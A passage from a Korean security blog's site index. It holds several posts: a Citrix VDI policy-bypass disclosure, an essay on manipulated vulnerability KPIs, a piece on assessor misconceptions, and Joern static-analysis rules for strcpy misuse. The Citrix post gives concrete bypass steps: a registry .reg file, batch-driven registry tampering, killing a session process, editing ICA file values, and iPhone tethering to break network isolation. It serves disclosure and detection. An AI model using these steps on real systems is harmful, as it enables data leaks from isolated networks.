취약점으로 인해 이러한 보안 정책을 우회할 가능성이 존재합니다.\n2. 보안 정책 우회 레지스트리 조작을 통한 우회 Citrix VDI 에이전트(PicaSvc2.exe)가 정책을 저장하는 과정에서 발생하는 레이스 컨디션을 이용해 레지스트리를 조작함으로써 보안 정책 우회가 가능합니다. 시트릭스는 이 취약점을 완화하기 위해 스텔스 패치를 적용했지만, 레지스트리 보안 설정을 조정하고 쓰기 권한을 거부함으로써 여전히 보안 정책을 비활성화할 수 있습니다.\nCSE의 강제 종료 시트릭스 CSE(시트릭스 서비스 엔진)가 강제로 종료되거나 삭제되면 보안 정책이 적용되지 않아, 제한된 리소스에 대한 무단 접근이 발생할 가능성이 있습니다.\nGPF 파일 조작 GPF(그룹 정책 파일)를 수정하거나 그 권한을 제한하여 보안 정책을 우회하려는 시도도 가능하지만, 이 방법은 불안정하며 여러 한계점이 존재합니다.\n3. 레지스트리 수정 및 쓰기 권한 거부를 통한 우회 사용자가 일반 계정(예: User A)으로 로그인하면, Citrix 보안 정책 설정은 Windows 세션 ID를 기반으로 레지스트리에 생성됩니다. 시트릭스가 보안보다 사용성을 우선시하는 경향으로 인해, 레지스트리 설정(CdmPolicies, IO, VCPolicies)을 수정하고 모든 사용자에 대해 쓰기 권한을 거부함으로써 보안 정책 우회가 가능해집니다. 이로 인해 재접속 시 보안 정책 우회가 이루어집니다.\n테스트 환경에서는 Citrix 보안 정책 레지스트리 설정이 변경되고 권한이 제한되면 자동 로그아웃이 발생합니다. ICA 파일 내의 ClearPassword, Domain, LogonTicket 등의 값을 임의의 값(예: “test”)으로 수정하면, 로컬 계정이 이 자동 로그아웃을 우회할 수 있습니다.\n또한, 로컬 보조 계정으로 로그인하면 강제 로그아웃 제한을 우회할 수 있습니다. 비록 시트릭스가 다중 로그인 세션을 제한하지만, Ctrl-Alt-Del을 눌러 작업 관리자를 실행하고 PicaSessionAgent.exe 프로세스를 종료함으로써 로그인을 완료할 수 있습니다.\n마지막으로, 로컬 계정(예: \u0026ldquo;windshock\u0026rdquo;)으로 로그인하면 Windows 세션 1에서 시트릭스 보안 정책이 우회되어 Citrix VDI를 사용할 수 있습니다.\n4. 결론 시트릭스의 보안 정책 적용 방식은 사용성을 우선시하는 것으로 보이며, 이는 사용자 접근성을 향상시킬 수 있지만 보안 정책 우회를 용이하게 하는 구조적 취약점을 초래합니다. 시트릭스를 사용하는 조직은 이러한 잠재적 보안 우회 가능성을 인식하고, 관리자들이 실시간으로 대응할 수 있도록 추가적인 내부 모니터링 또는 경보 시스템을 구현해야 합니다.\n더 나아가, 시트릭스가 Xen Hypervisor와 같은 하위 시스템 수준에서 보안 정책을 강제한다면, 보안과 사용성 사이의 균형을 유지하면서 우회 시도를 효과적으로 차단할 수 있을 것입니다. 이를 통해 조직은 요구되는 보안 수준과 시트릭스가 제공하는 접근성을 모두 달성할 수 있습니다.\nReferences Citrix Group Policy Troubleshooting for XenApp and XenDesktop 시트릭스 정책 우회는 취약점이 아니라 법률 위반이다 ","permalink":"http://localhost:1313/ko/post/2024-11-05-review-of-citrix-security-policy-effectiveness/","summary":"\u003ch1 id=\"시트릭스-보안-정책-효과성-검토\"\u003e시트릭스 보안 정책 효과성 검토\u003c/h1\u003e\n\u003ch2 id=\"1-서론\"\u003e1. 서론\u003c/h2\u003e\n\u003cp\u003e시트릭스 관리자들은 Citrix 그룹 정책을 통해 각 사용자의 VDI(가상 데스크탑 인프라)에 보안 정책을 적용합니다. 그러나 Citrix CSE(시트릭스 서비스 엔진)와 Citrix VDI 에이전트 내의 일부 구조적 취약점으로 인해 이러한 보안 정책을 우회할 가능성이 존재합니다.\u003c/p\u003e\n\u003ch2 id=\"2-보안-정책-우회\"\u003e2. 보안 정책 우회\u003c/h2\u003e\n\u003ch3 id=\"레지스트리-조작을-통한-우회\"\u003e레지스트리 조작을 통한 우회\u003c/h3\u003e\n\u003cp\u003eCitrix VDI 에이전트(PicaSvc2.exe)가 정책을 저장하는 과정에서 발생하는 레이스 컨디션을 이용해 레지스트리를 조작함으로써 보안 정책 우회가 가능합니다. 시트릭스는 이 취약점을 완화하기 위해 스텔스 패치를 적용했지만, 레지스트리 보안 설정을 조정하고 쓰기 권한을 거부함으로써 여전히 보안 정책을 비활성화할 수 있습니다.\u003c/p\u003e","title":"시트릭스 보안 정책 효과성 검토"},{"content":"KPI가 사고를 일으킨다!!! - 잘못된 지표는 잘못된 결과를 낳는다. 오래전 메일을 뒤적이다가, 내가 너무 진지하게 보낸 메일에 대한 후배의 답변을 확인했다. 매니저님의 메일을 받고, 깊이 고민하지 않고 지시대로만 일을 수행하고 있음을 깨달았다. 어떤 업무 지시를 받든 해당 업무에 윤리적 이슈가 없는지, 그리고 그대로 수행하는 것이 맞는지 확실히 생각해보고 내 의지대로 진행해야겠다고 다짐했다.\n메일을 자세히 살펴보니, 그 후배는 취약점 현황 시스템을 관리하던 사람이었고, 팀장의 명령으로 고위험 취약점의 위험도를 일괄 낮추도록 조치한 뒤, 내가 윤리적 문제를 제기한 메일에 대해 답변한 것이었다. (오랜 시간이 지난 지금은 상황이 달라졌지만, 당시에는 참 착한 후배였다\u0026hellip;)\n몇 해 전, 임원평가를 앞둔 연말 즈음, 통제가 어려운 취약점 조치 KPI를 높이기 위해 팀장이 KPI 자체를 조작하려 한 적이 있었다. 그 직책자의 비윤리적 행위가 어떤 부작용을 낳았을지 궁금해졌다.\n과거 진단 업무와 사고 이력을 살펴보던 중, KPI가 실제로 보안 사고를 일으킨 사례를 확인하게 되었다. 보안과 관련된 사항이라 구체적인 내용을 밝히긴 어렵지만, “[단독] 해커에게 금융거래 인증문자 착신전환…비트코인 계좌 털려” 등의 뉴스 기사를 통해 간접적으로 접했던 기억이 있다. (착신전환 외에도 다양한 방법이 가능했다.)\n만약 KPI가 없었다면, 실무는 정상적으로 운영되어 사고가 발생하지 않았을 것이다. 그러나 현대 조직 구조에서 KPI는 빼놓을 수 없는 요소이다.\nKPI 구성이 잘못된 것일까? 평가자 입장에서 결과 중심(사고가 없든, 취약점이 없든)으로 지표를 설정할 수밖에 없었을 것이다.\nKPI를 관리하는 절차가 느슨했던 것일까? 아니면 타이트하게 수시로 피드백을 주며 평가에 반영했더라도 문제가 있었던 것일까? 당시 별도의 TF를 구성해 취약점 위험도에 대해 수시로 피드백을 진행했음에도 불구하고 말이다.\n결국, 시간이 지나면서 직책자 평가에 사용되는 KPI는 형식적이라는 사실을 깨달았다. 피터 드러커는 “측정할 수 없는 것은 관리할 수 없다”고 했는데, 사람이 만든 조직에서 기계적인 평가는 처음부터 맞지 않으며, 결국 사람의 욕심에 의해 조작될 수밖에 없다. 과연 우리는 조직을 효과적으로 관리할 수 있을까? 기업은 본질을 우선시할 수 있을까?\nWorks Cited “[단독] \u0026lsquo;해커에게 금융거래 인증문자 착신전환…비트코인 계좌 털려.\u0026rsquo;” 연합뉴스, 2017년 12월 3일, https://www.yna.co.kr/view/MYH20171203004600038. (접근일: 2024년 6월 16일)\n“잘못된 지표는 잘못된 결과를 낳는다.” 중앙일보, 2017년 3월 5일, https://www.joongang.co.kr/article/21337981#home.\n","permalink":"http://localhost:1313/ko/post/2024-06-20-kpi-causes-accidents/","summary":"\u003ch2 id=\"kpi가-사고를-일으킨다---잘못된-지표는-잘못된-결과를-낳는다\"\u003eKPI가 사고를 일으킨다!!! - 잘못된 지표는 잘못된 결과를 낳는다.\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"KPIs Incidents Toon\" loading=\"lazy\" src=\"/images/post/kpis_incidents.webp\"\u003e\u003c/p\u003e\n\u003cp\u003e오래전 메일을 뒤적이다가, 내가 너무 진지하게 보낸 메일에 대한 후배의 답변을 확인했다. 매니저님의 메일을 받고, 깊이 고민하지 않고 지시대로만 일을 수행하고 있음을 깨달았다. 어떤 업무 지시를 받든 해당 업무에 윤리적 이슈가 없는지, 그리고 그대로 수행하는 것이 맞는지 확실히 생각해보고 내 의지대로 진행해야겠다고 다짐했다.\u003c/p\u003e\n\u003cp\u003e메일을 자세히 살펴보니, 그 후배는 취약점 현황 시스템을 관리하던 사람이었고, 팀장의 명령으로 고위험 취약점의 위험도를 일괄 낮추도록 조치한 뒤, 내가 윤리적 문제를 제기한 메일에 대해 답변한 것이었다. (오랜 시간이 지난 지금은 상황이 달라졌지만, 당시에는 참 착한 후배였다\u0026hellip;)\u003c/p\u003e","title":"KPI가 사고를 일으킨다!!!"},{"content":"보안진단 담당자의 흔한 착각 비효율적인 취약점 평가 구조와 대응 방법 서론 사이버 보안 환경이 끊임없이 변화하면서 보안 취약점 평가는 잠재적인 보안 침해에 대한 주요 방어수단으로 자리잡고 있습니다. 그러나 이에 대한 일반적인 오해로 인해 평가의 실효성이 저하되는 경우가 많습니다. 본 글에서는 보안 취약점 평가에 대한 잘못된 인식을 살펴보고, 이를 극복할 수 있는 효과적인 전략을 제시함으로써 조직의 보안 수준 향상을 지원하고자 합니다.\n보안 취약점 평가에 대한 잘못된 인식 1. 모든 취약점을 반드시 찾아내야 한다는 믿음 보안 취약점 평가 담당자들 사이에는 모든 취약점을 반드시 찾아내야 한다는 생각이 팽배합니다. 이는 인간 평가자의 한계를 이해하지 못한 것입니다. Tyma 등(2019)[1]의 연구에 따르면, 광범위한 노력에도 불구하고 일부 취약점만이 발견되었다고 합니다. 또한 회사의 승인 없이 취약점을 분석한 외부인에 대해 배타적인 자세를 보이는 경우도 있습니다. 이러한 인식의 한계는 평가 담당자들에게 좌절감과 불만을 야기할 수 있습니다.\n2. 보안 점검자의 능력에 대한 과장된 인식 보안 점검 담당자들은 모든 취약점을 반드시 찾아내야 한다고 착각하며, 자신이 발견하지 못한 취약점이 보고되면 화를 내는 경향이 있습니다. 이를 극복하려면 보안 점검자의 능력 한계를 인정하고, 외부 리소스(외부 전문가, 버그바운티 등)[2]를 활용해 취약점을 체계적으로 관리하는 노력이 필요합니다.\n3. 취약점에 대한 상세한 설명으로 문제가 해결될 것이라는 착각 많은 이들은 개발자에게 취약점에 대한 상세한 정보를 제공하면 보안 문제가 완전히 해결될 것이라고 생각합니다. 그러나 OWASP Top 10[3]에서 볼 수 있듯이, 상세한 이해에도 불구하고 기본적인 보안 문제는 지속적으로 발생합니다. 이는 근본적인 구조적 문제로, 취약점 정보만으로는 이를 해결하기 어렵습니다.\n실효성 있는 취약점 평가를 위한 전략 1. 통합적인 보안 설계 접근 개발자의 업무와 이해관계자의 요구사항을 이해하고, 이를 반영하여 구체적인 보안 설계 사양을 수립해야 합니다[2]. 단순히 취약점을 찾는 것이 아닌, 포괄적인 보안 설계 접근이 필요합니다.\n2. 체계적인 취약점 관리 프로세스 마련 취약점 발견 프로세스를 체계화하고, 버그 바운티, 침투 테스트 등 외부 자원을 활용해 취약점 발견 범위를 확대하며, 평가의 일관성과 효율성을 높일 수 있습니다(Shostack, 2014)[4].\n3. 보안 보고 기술 향상 취약점을 실증하지 않고도 효과적으로 보고할 수 있는 기술을 익힘으로써 평가의 효율성과 정확성을 높일 수 있습니다. CVSS(Common Vulnerability Scoring System) 등의 표준화된 도구를 활용하는 것도 도움이 됩니다(Ferrante \u0026amp; Canali, 2012)[5].\n결론 보안 취약점 평가는 강력한 사이버 보안 전략의 핵심 요소입니다. 일반적인 오해를 해소하고 체계적이며 통합적인 접근법을 구현함으로써 조직은 보안 수준을 높이고 잠재적인 위협의 위험을 줄일 수 있습니다. 인간 평가자의 한계를 인정하고, 보안 설계 중심의 접근, 체계적인 취약점 관리, 보고 기술 향상을 통해 끊임없이 변화하는 사이버 위협에 효과적으로 대응할 수 있을 것입니다.\n[1] Tyma, G. et al. (2019). \u0026ldquo;Limitations of Human Vulnerability Assessors: A Comparative Study.\u0026rdquo; Proceedings of the 34th Annual Computer Security Applications Conference.\n[2] Whitman, M. E., \u0026amp; Mattord, H. J. (2016). Principles of Information Security. Cengage Learning.\n[3] OWASP. (2021). \u0026ldquo;OWASP Top 10.\u0026rdquo; The Open Web Application Security Project.\n[4] Shostack, A. (2014). Threat Modeling: Designing for Security. Wiley.\n[5] Ferrante, A., \u0026amp; Canali, C. (2012). \u0026ldquo;A Systematic Approach to the Assessment of Security Vulnerabilities.\u0026rdquo; Journal of Information Security and Applications, 17(6), 318-329.\n","permalink":"http://localhost:1313/ko/post/2024-06-16-common-misconceptions-of-security-assessors/","summary":"사이버 보안 환경이 끊임없이 변화하면서 보안 취약점 평가는 잠재적인 보안 침해에 대한 주요 방어수단으로 자리잡고 있습니다. 그러나 이에 대한 일반적인 오해로 인해 평가의 실효성이 저하되는 경우가 많습니다. 본 글에서는 보안 취약점 평가에 대한 잘못된 인식을 살펴보고, 이를 극복할 수 있는 효과적인 전략을 제시함으로써 조직의 보안 수준 향상을 지원하고자 합니다.","title":"보안진단 담당자의 흔한 착각"},{"content":"개발문화가 보안수준에 영향을 미칠 수 있을까? 정적 분석 도구(joern)를 이용한 코드 품질과 보안 수준의 평가 배경 개방적이고 협업 중심의 개발문화를 가진 구글 등 회사와 달리, 그렇지 못한 일부 조직에서는 개인의 역량에 따라 코드의 품질 - 보안 수준을 포함하여 - 이 좌우될 수 있습니다. 특히, C 코드에서 strcpy 함수를 사용하는 등의 품질 낮은 코드를 작성하는 경향이 있는 개발자들에게 정적 분석 도구(joern, codeQL 등)을 커스텀 룰을 활용하여 코드의 품질과 보안 수준을 평가하여 제공할 수 있습니다. 결과적으로 개발 문화가 부족한 제한된 상황에서도 코드 품질과 동시에 보안수준이 향상되는, Good한 수준의 코드를 기대할 수 있습니다.\n구글의 개발문화 구글에서는 Google C++ Style Guide를 활용하여 C++ 코드를 작성하고 관리하는데, 이를 회사 조직 차원에서 적용하는 방법은 다음과 같습니다:\n조직 문화: 구글은 개방적이고 협업 중심의 조직 문화를 가지고 있습니다. 이러한 문화는 개발자들이 서로 협력하고, 지식을 공유하며, 서로의 코드를 검토하고 피드백을 주는 환경을 조성합니다2. 이는 코딩 스타일 가이드를 준수하고, 코드의 품질을 높이는 데 도움이 됩니다2. 교육 및 훈련: 구글은 새로운 개발자들에게 코딩 스타일 가이드를 준수하는 방법을 교육하고, 이를 실제 작업에 적용하는 방법을 훈련합니다. 이는 개발자들이 코딩 스타일 가이드를 이해하고, 이를 자신의 작업에 적용하는 데 도움이 됩니다. 도구 및 자원 제공: 구글은 개발자들에게 코딩 스타일 가이드를 준수하는 데 필요한 도구와 자원을 제공합니다1. 예를 들어, cpplint와 같은 lint 툴을 제공하여 코드 스타일 가이드를 준수하는지 자동으로 검사할 수 있습니다. 이러한 방식을 통해 구글은 조직 차원에서 코딩 스타일 가이드를 적용하고, 이를 통해 코드의 일관성을 유지하고, 코드의 품질을 높이는 데 도움이 됩니다. 이 외에도 Google Style Guide에는 다양한 코딩 표준과 규칙이 포함되어 있으며, C++ 표준 위원회 C++ Core Guidelines 자료도 있으니 참고하세요.\n개발문화가 없는 조직 대조적으로 일부 조직에는 강력한 개발 문화가 협업과 코딩 표준 준수를 장려하는 응집력 있는 문화가 부족합니다. 이는 개발을 자주 아웃소싱하고 아웃소싱 파트너가 자주 변경되는 기업의 경우 특히 그렇습니다. 이러한 시나리오에서는 일관되지 않은 관행, 개발자 간의 기술 수준 차이, 응집력 있는 표준 부족으로 인해 보안 수준을 포함한 코드 품질이 저하될 수 있습니다. 결과적으로 이러한 조직은 보안 취약성 및 차선의 코드 품질로 인한 위험이 높아집니다.\nstrcpy 함수의 위험성 strcpy 함수는 문자열을 복사하는 함수입니다. 그러나 이 함수의 주요 문제점은 메모리의 경계를 검사하지 않는다는 것입니다. 즉, 복사될 메모리의 크기보다 원본 문자열의 크기가 더 크면 버퍼 오버플로우 버그가 발생할 수 있습니다. 이는 프로그램 실행 시에 오류를 발생시키거나 프로그램이 오작동할 수 있습니다.\n이러한 문제를 해결하기 위해 C11 표준에서는 strcpy_s 함수를 제공합니다. strcpy_s 함수는 strcpy 함수의 단점을 보완하기 위해 만들어진 함수로, 이 함수를 사용할 때는 복사될 메모리의 크기를 두 번째 인자에 꼭 적어주어야 합니다. 이렇게 하면 버퍼 오버플로우 문제를 방지할 수 있습니다.\n정적 분석 도구 Joern을 사용하면 포괄적인 CPG(코드 속성 그래프)가 구문, 제어 흐름 및 데이터 흐름을 통합 구조로 통합하여 복잡한 보안 취약성과 코드 문제를 철저하게 감지할 수 있으므로 유리합니다. 또한 Joern의 사용자 정의 가능한 쿼리를 통해 특정 프로젝트 요구 사항에 맞는 정밀한 취약성 탐지가 가능하며 확장성 덕분에 대규모 코드베이스를 효율적으로 분석할 수 있습니다. 개발 라이프사이클의 다양한 단계를 자동화하고 통합하는 이 도구의 기능은 문제를 조기에 감지하여 전반적인 코드 품질을 향상시키는 데 도움이 됩니다. 또한 Joern은 여러 프로그래밍 언어를 지원하므로 다양한 개발 환경에 다용도로 사용할 수 있습니다.\n그러나 반드시 Joern을 사용할 필요는 없습니다. CodeQL 및 Checkmarx와 같은 유사한 도구도 강력한 정적 분석 기능을 제공합니다. 자세한 내용은 Joern 문서 및 그래프 데이터베이스 및 코드 분석 기법에 대한 관련 자료를 참조하세요.\n커스텀 룰 예시 구분 Good (보안수준: 양호, 코드품질 : 양호) Normal (보안수준 : 미흡 , 코드품질 : 낮음) Bad (보안수준 : 취약, 코드품질 : 낮음) 설명 입력 값의 유효성 검사는 항상 이루어져야 합니다. 입력 값의 크기를 항상 확인하거나 함수 자체에서 입력의 크기를 검사하는 함수 (strncpy, strlcpy, strcpy_s 등) 들로 대체하여 사용해야합니다. 입력 값의 크기를 확인하여 변수를 생성하고 있으나 위험한 함수를 사용하고 있습니다. 개발자가 데이터 타입에 대한 입력 값 크기를 착각 하는 예외적인 케이스에 취약할 수 있습니다. 입력의 크기를 확인하지 않고 버퍼 복사하는 것 (\u0026lsquo;전통적인 버퍼 오버플로우\u0026rsquo;) 버퍼 오버 플로우 취약점을 통해, 권한 상승, 의도되지 않은 명령 실행 등의 시스템에 심각한 위험을 초래할 수 있습니다. Case strlen_malloc_strncpy ZIP_EXTERN zip_int64_t zip_add_dir(struct zip *za, const char *name) { size_t MAXSIZE = 1024; char* sInput = (char*)malloc(MAXSIZE); memset(sInput, 0, MAXSIZE); \u0026hellip; \u0026hellip; const jbyte* javaStr; jint result = -1; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, NULL); if(javaStr == NULL) goto end; strncpy(sInput, javaStr, MAXSIZE); \u0026hellip;\u0026hellip; \u0026hellip;\u0026hellip; } strlen_malloc_strcpy ZIP_EXTERN zip_int64_t zip_add_dir(struct zip *za, const char *name) { int len; char *s; \u0026hellip;\u0026hellip; s = NULL; len = strlen(name); if (name[len-1] != \u0026lsquo;/\u0026rsquo;) { if ((s=(char *)malloc(len+2)) == NULL) { _zip_error_set(\u0026amp;za-\u0026gt;error, ZIP_ER_MEMORY, 0); return -1; } strcpy(s, name); \u0026hellip;\u0026hellip; } malloc(정수)_strcpy Java_com_skt_skaf_OA00050017_engine_ComicEngineJNI_Open (JNIEnv* env, drmFileName, \u0026hellip;\u0026hellip;) { char* sInput = (char*)malloc(1024); \u0026hellip;\u0026hellip; const jbyte* javaStr; \u0026hellip;\u0026hellip; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, ((void*)0)); \u0026hellip;\u0026hellip; strcpy(sInput, javaStr); \u0026hellip;\u0026hellip; } Source/ Sink Source : * Sink : strncpy, strlcpy, strcpy_s Source : * Sink : strcpy, strcat, sprintf, vsprintf, gets Source : GetStringUTFChars Sink : strcpy, strcat, sprintf, vsprintf, gets Pattern malloc의 param이 더하기 표현이며, 그 malloc의 data flow 상 선행으로 strlen, 후행으로 strcpy이다. malloc의 param이 더하기 표현이며, 그 malloc의 data flow 상 선행으로 strlen, 후행으로 strcpy이다. malloc의 param에 정수를 입력하고 data flow 상에서 strcpy를 사용한다. 길이 제한이 없는 알려진 함수(GetStringUTFChars 등)의 결과 값을 strcpy의 input 값으로 사용한다. Rule echo \u0026quot; \\ getCallsTo(\u0026lsquo;malloc\u0026rsquo;) \\ .ithArguments(\u0026lsquo;0\u0026rsquo;).children().has(\u0026rsquo;type\u0026rsquo;,\u0026lsquo;AdditiveExpression\u0026rsquo;).statements() \\ .or( \\ __.in(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;)) \\ .out(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*malloc.*\u0026rsquo;)), \\ __.has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;)) \\ ).out(\u0026lsquo;REACHES\u0026rsquo;) \\ .has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*strncpy.* .*strlcpys.* .*strcpy_s.*\u0026rsquo;)) \\ .id()\u0026quot; 참고 https://randomascii.wordpress.com/2013/04/03/stop-using-strncpy-already/ https://www.cse.psu.edu/~gxt29/papers/jdksecurity.pdf ","permalink":"http://localhost:1313/ko/post/2024-05-22-can-development-culture-influence-security-levels/","summary":"\u003ch1 id=\"개발문화가-보안수준에-영향을-미칠-수-있을까\"\u003e개발문화가 보안수준에 영향을 미칠 수 있을까?\u003c/h1\u003e\n\u003cp\u003e\u003cimg alt=\"Development Culture\" loading=\"lazy\" src=\"/images/post/development-culture.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"정적-분석-도구joern를-이용한-코드-품질과-보안-수준의-평가\"\u003e정적 분석 도구(joern)를 이용한 코드 품질과 보안 수준의 평가\u003c/h2\u003e\n\u003ch1 id=\"배경\"\u003e배경\u003c/h1\u003e\n\u003cp\u003e\u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ea%b5%ac%ea%b8%80%ec%9d%98-%ea%b0%9c%eb%b0%9c%eb%ac%b8%ed%99%94\"\u003e개방적이고 협업 중심의 개발문화를 가진 구글\u003c/a\u003e 등 회사와 달리, \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ea%b0%9c%eb%b0%9c%eb%ac%b8%ed%99%94%ea%b0%80-%ec%97%86%eb%8a%94-%ec%a1%b0%ec%a7%81\"\u003e그렇지 못한 일부 조직\u003c/a\u003e에서는 개인의 역량에 따라 코드의 품질 - 보안 수준을 포함하여 - 이 좌우될 수 있습니다. 특히, C 코드에서 \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#strcpy-%ed%95%a8%ec%88%98%ec%9d%98-%ec%9c%84%ed%97%98%ec%84%b1\"\u003estrcpy 함수\u003c/a\u003e를 사용하는 등의 품질 낮은 코드를 작성하는 경향이 있는 개발자들에게 \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ec%a0%95%ec%a0%81-%eb%b6%84%ec%84%9d-%eb%8f%84%ea%b5%ac\"\u003e정적 분석 도구\u003c/a\u003e(joern, codeQL 등)을 \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ec%bb%a4%ec%8a%a4%ed%85%80-%eb%a3%b0-%ec%98%88%ec%8b%9c\"\u003e커스텀 룰\u003c/a\u003e을 활용하여 코드의 품질과 보안 수준을 평가하여 제공할 수 있습니다. 결과적으로 개발 문화가 부족한 제한된 상황에서도 코드 품질과 동시에 보안수준이 향상되는, Good한 수준의 코드를 기대할 수 있습니다.\u003c/p\u003e","title":"개발문화가 보안수준에 영향을 미칠 수 있을까?"},{"content":"시트릭스 정책 우회는 취약점이 아니라 법률 위반이다 주의!! cert.org의 VINCE를 통한 Citrix와의 논의를 바탕으로, 이 문제는 관리 권한이 필요하기 때문에 취약점으로 분류되지 않는 것으로 결론지어졌습니다. 따라서 보안상의 문제 없이 이 정보를 공유할 수 있습니다. 그러나 보안상의 이유로, 논리적으로 격리되거나 폐쇄된 네트워크와 같은 특수 환경에서는 Xendesktop (VDI)의 사용을 권장하지 않습니다. 만약 VDI를 반드시 사용해야 한다면, 관리자 권한을 제거하고 보안 전용 소프트웨어를 설치해야 합니다.\n관리자 권한이 필요하다는 점은 위험을 낮출 수 있지만, 잠재적인 영향력을 완전히 제거하지는 않습니다. 아래는 Citrix 정책이 어떻게 우회될 수 있는지에 대한 상세한 기술 설명입니다.\n설명 Citrix VDI 에이전트(PicaSvc2.exe)는 Citrix 관리 서버로부터 정책을 수신하고, 이를 레지스트리(HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User)에 기록한 후, 레지스트리에서 읽어 정책을 적용하는 구조로 보입니다. 공격자는 아래의 개념 증명(POC)을 참고하여, 레지스트리 조작을 통해 Citrix 정책 서버가 강제하는 드라이브, 네트워크 접근, 클립보드 작업 등의 보안 정책을 우회할 수 있습니다.\nCitrix의 Common Criteria 인증 문서에 따르면, 이러한 구성 데이터(Configdata)가 공격자에 의해 변경되지 않도록 보호하는 메커니즘이 설계되어 있습니다. 이와 같은 우회는 구현상의 결함으로 간주될 수 있습니다.\n폐쇄되거나 격리된 네트워크 환경에서 VDI를 사용할 경우, Citrix 정책을 우회하여 VDI를 강제로 인터넷에 연결하게 되면 민감한 내부 정보가 외부로 유출될 위험이 있습니다. 특히 대한민국에서는 이러한 행위가 명백한 법 위반으로 간주되며, 네트워크 격리 대책에 대한 재검토가 필요합니다.\n개념 증명 (POC) 공격자는 우선 회사 계정에 접근한 후, 회사의 Citrix VDI(Windows 10 실행 중)에 로그인해야 합니다. VDI 환경은 일반적으로 네트워크 접근, 프린터 사용, 외부 드라이브 연결, 클립보드 접근 등이 제한되어 있습니다.\n공격자는 VDI에 로그인하여 레지스트리를 지속적으로 수정하는 배치 파일(다운로드 링크)을 실행한 후, VDI 세션에서 로그아웃합니다.\n배치 파일을 실행하여 레지스트리를 수정한 후, 공격자는 VDI에서 로그아웃합니다. 재로그인 시, 레지스트리 값이 변조되어 Citrix 정책을 우회할 수 있게 됩니다.\n예시 레지스트리 수정 내용:\nWindows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User] \u0026#34;AutoConnectDrives\u0026#34;=dword:00000001 \u0026#34;AllowCdromDrives\u0026#34;=dword:00000001 \u0026#34;AllowFixedDrives\u0026#34;=dword:00000001 \u0026#34;AllowFloppyDrives\u0026#34;=dword:00000001 \u0026#34;AllowNetworkDrives\u0026#34;=dword:00000001 \u0026#34;AllowRemoveableDrives\u0026#34;=dword:00000001 \u0026#34;UseAsyncWrites\u0026#34;=dword:00000001 \u0026#34;ReadOnlyMappedDrive\u0026#34;=dword:00000000 VDI에 다시 로그인하면, PicaSvc2.exe가 Citrix 서버로부터 정책 설정을 가져와 레지스트리에 저장합니다.\nPicaSvc2.exe가 정책을 쓰고 읽는 동안, 이미 배치 파일에 의해 레지스트리 값이 조작되어 있습니다.\nPicaSvc2.exe는 조작된 정책을 VDI 환경에 적용합니다.\n추가 사항:\n연결 PC의 레지스트리를 수정함으로써 하드웨어 리디렉션이 활성화되어 무단 네트워크 접근이 가능해질 수 있습니다. Citrix의 기본 정책은 USB 클래스 FFh를 허용하므로, iPhone을 테더링 용도로 사용하거나 USB 기반 무선 카드를 통해 네트워크 격리를 우회할 수 있습니다. iPhone 테더링을 활성화하려면, 공격자는 iTunes 설치 프로그램에서 추출한 드라이버인 Apple 네트워크 드라이버와 Apple USB 드라이버를 설치해야 합니다. Citrix 세션에서 iPhone을 리디렉션하면, 네트워크 격리 환경에서도 인터넷 접근이 가능해집니다. 영향 VDI를 사용하여 논리적 네트워크 분리를 유지하는 기업의 경우, 이 취약점을 통해 내부 정보 유출 및 내부 서버에 대한 무단 접근이 발생할 수 있습니다.\n잠재적 영향을 고려할 때, 이러한 공격을 실시간으로 탐지하고 완화하는 것이 매우 중요합니다. 아래는 잠재적인 우회 활동을 발견하고 모니터링하는 단계입니다.\n탐지 이 문제를 탐지하기 위해:\nProcmon을 사용하여 PicaSvc2.exe의 동작을 모니터링합니다. Citrix 에이전트가 정책 설정을 저장하는 레지스트리 키를 조사합니다. 해당 레지스트리 값의 변경 효과를 조작하고 관찰합니다. 설계 분석 Citrix의 Common Criteria 인증 문서에는 구성 데이터의 무단 변경을 방지하기 위한 조치들이 포함되어 있습니다. Citrix의 Common Criteria 인증 정보에 따르면, 가상 데스크탑이나 애플리케이션의 설정과 할당에 필요한 데이터의 기밀성과 무결성이 서버 간 전송 중에도 유지됩니다. 이 설계에는 공격자, 애플리케이션 사용자 또는 데스크탑 사용자가 구성 데이터를 변경하지 못하도록 하는 예방 조치도 포함되어 있습니다.\nCitrix가 위에 언급된 보안 기능들을 구현했음에도 불구하고, 특히 대한민국과 같이 엄격한 네트워크 격리 법규가 적용되는 지역에서는 법적 고려사항도 반드시 검토되어야 합니다.\nCitrix의 보안 목표인 O.Secure_Setup_Data, OE.TLS, OE.Encryption 등은 서버 간 처리 및 전송 중에 구성 데이터의 기밀성과 무결성을 보장합니다.\n자세한 보안 목표와 관리 기능의 역할에 대해서는 다음을 참조하세요:\nFMT_SMF.1/Authorise: 엔드포인트 데이터 접근 제어 정책 관리 FMT_MSA.1/Desktop FMT_MSA.3/Desktop FMT_MSA.1/Application FMT_MSA.3/Application FPT_ITT.1 법적 고려사항 대한민국에서는 전자금융거래법에 따라 금융감독원이 논리적 네트워크 분리를 선택적으로 구현할 수 있는 조치를 도입하였습니다. 금융 기관은 민감한 데이터가 외부 공격으로부터 보호받도록 네트워크 격리 조치를 채택하여 무단 접근을 차단하고 사고를 예방해야 합니다.\n해당 공격은 관리자 권한이 필요하므로, 기업은 논리적으로 분리된 네트워크 환경에서 PC 사용자에 대한 관리자 권한 제거 정책을 재검토해야 합니다. 